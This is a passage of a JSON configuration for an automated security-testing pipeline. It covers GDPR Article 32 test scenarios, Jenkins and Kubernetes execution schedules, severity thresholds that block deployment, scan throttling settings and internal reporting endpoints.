      "gdpr_scenarios": [
        {
          "requirement": "Article 32 - Security of processing",
          "test_scenarios": [
            "Personal data encryption verification",
            "Access logging completeness",
            "Data breach detection capabilities"
          ]
        }
      ]
    },

    "automated_penetration_test_execution": {
      "test_execution_framework": {
        "orchestration_tool": "Jenkins Pipeline",
        "containerized_testing": true,
        "parallel_execution": true,
        "test_environment": "Kubernetes namespace: security-testing"
      },
      "execution_scheduling": {
        "continuous_testing": {
          "enabled": true,
          "trigger": "code_commit",
          "baseline_tests_only": true
        },
        "nightly_full_scan": {
          "enabled": true,
          "schedule": "0 2 * * *",
          "full_test_suite": true
        },
        "weekly_compliance_scan": {
          "enabled": true,
          "schedule": "0 1 * * 0",
          "compliance_focused": true
        }
      },
      "quality_gates": {
        "severity_thresholds": {
          "critical": 0,
          "high": 0,
          "medium": 5,
          "low": 20
        },
        "pipeline_actions": {
          "threshold_exceeded": [
            "block_deployment",
            "generate_security_report",
            "notify_security_team",
            "create_security_jira_tickets"
          ]
        }
      }
    },

    "security_scanning_parameters": {
      "scan_optimization": {
        "concurrent_threads": 4,
        "request_throttling": "100_requests_per_second",
        "timeout_configuration": {
          "connection_timeout": "30s",
          "read_timeout": "60s",
          "scan_timeout": "120m"
        }
      },
      "result_processing": {
        "false_positive_filtering": true,
        "vulnerability_deduplication": true,
        "risk_scoring": "CVSS_3.1",
        "report_formats": ["json", "html", "junit_xml"]
      },
      "integration_endpoints": {
        "security_dashboard": "http://grafana:3000/d/security",
        "vulnerability_management": "http://defectdojo:8080",
        "notification_webhook": "http://slack-webhook/security-alerts"
      }
    }
  }
}